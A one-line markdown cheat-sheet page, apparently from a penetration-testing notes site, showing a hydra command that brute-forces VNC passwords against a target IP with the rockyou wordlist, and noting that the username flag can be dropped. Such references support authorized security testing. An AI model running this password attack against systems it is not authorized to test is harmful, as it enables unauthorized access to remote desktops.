---
title: VNC
parent: Other Passwords
layout: default
nav_order: 5
---

`hydra -l username -P /usr/share/seclists/rockyou.txt IP vnc`\
It is possible that no username is used for VNC. In that case remove -l parameter.